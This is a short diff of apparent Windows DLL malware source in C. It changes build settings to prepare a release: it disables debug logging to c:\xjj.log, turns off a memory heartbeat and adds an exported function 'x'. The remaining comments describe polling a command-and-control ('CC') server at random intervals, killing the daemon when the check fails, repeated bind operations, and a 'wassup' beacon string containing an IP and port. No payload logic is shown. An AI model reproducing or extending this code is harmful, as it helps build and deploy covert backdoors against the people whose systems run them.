@@ -10,18 +10,19 @@
 #include <stdarg.h>
 #include <stdio.h>
 
-#define _DEBUG_ // 无视时间限制
+#define _RELEASE_ // ready to release
+
+//#define _DEBUG_ // 无视时间限制
 //#define _DEBUG_PRINT_
-#define _DEBUG_PRINT_TO_FILE_ // PRINT 无视 _DEBUG_PRINT_ 输出到文件
-#define _DEBUG_PRINT_FILE_NAME_ "c:\\xjj.log"
+//#define _DEBUG_PRINT_TO_FILE_ // PRINT 无视 _DEBUG_PRINT_ 输出到文件
+//#define _DEBUG_PRINT_FILE_NAME_ "c:\\xjj.log"
 #define CHECK_LOCAL_TIME_SPLIT (60) // 查本地时间并查 CC 的间隔，无效则杀死 daemon
 #define RANDOM_SEND_GET_SPLIT_RANGE (10) // 查 CC 时插入随机时间的最大值
 #define BIND_SPLIT_RANDOM_BASE (4)	// 两次 bind 操作之间的间隔
 #define BIND_SPLIT_RANDOM_RANGE (2)	// 两次 bind 操作之间的间隔
 #define DEFAULT_BUFLEN (44) // must larger than lenth "wassup000.000.000.000:00000wassup"
 #define DEFAULT_PORT (80)
-#define HEART_BEAT_WRITE_MEMORY
-#define HEART_BEAT_ADDRESS (0x1ff00)
+//#define HEART_BEAT_WRITE_MEMORY
 #define HEART_BEAT_SPLIT (4) // 心跳间隔
 
 #ifdef _DEBUG_PRINT_
@@ -42,7 +43,8 @@ static FILE *f_handle ;
   }
 #endif
 
-__declspec(dllexport) BOOL WINAPI DllMain(
+__declspec(dllexport) void x( void* data ) ;
+BOOL WINAPI DllMain(
   _In_ HINSTANCE hinstDLL,
   _In_ DWORD     fdwReason,
   _In_ LPVOID    lpvReserved
